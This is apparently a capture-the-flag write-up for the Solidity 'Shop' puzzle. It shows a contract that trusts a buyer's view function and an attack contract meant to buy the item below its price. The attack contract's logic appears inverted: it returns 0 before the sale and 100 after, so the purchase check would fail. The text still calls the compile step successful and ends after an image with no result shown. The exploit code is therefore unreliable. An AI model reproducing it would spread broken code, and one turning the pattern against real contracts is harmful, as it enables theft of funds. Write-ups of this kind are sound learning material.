# Task

Сan you get the item from the shop for less than the price asked?

# Contract

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}
```

Below is the attack contract

```sol
//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "./shop.sol";

contract shopAttack {
    Shop public buyer;

    constructor(address _targetaddr) {
        buyer = Shop(_targetaddr);
    }

    function price() external view returns(uint) {
        if (buyer.isSold()) {
            return 100;
        } else {
            return 0;
        }
    }

    function buy() external {
        buyer.buy();
    }
}
```
We can compile this using forge

![image](https://github.com/user-attachments/assets/2dbd4a6e-c18f-44e0-ac06-ec1d7d4931a0)

We've successfully compiled the attack contract and we got the contract address to be `0x5A6dD3c52df84Fea9c50f0c6ad9d56656EaA7abf`

Lets start out by calling the `price()` function in the attack contrat

![image](https://github.com/user-attachments/assets/6b43c76e-91b9-4fb7-ae0a-e90af0b43c3c)


























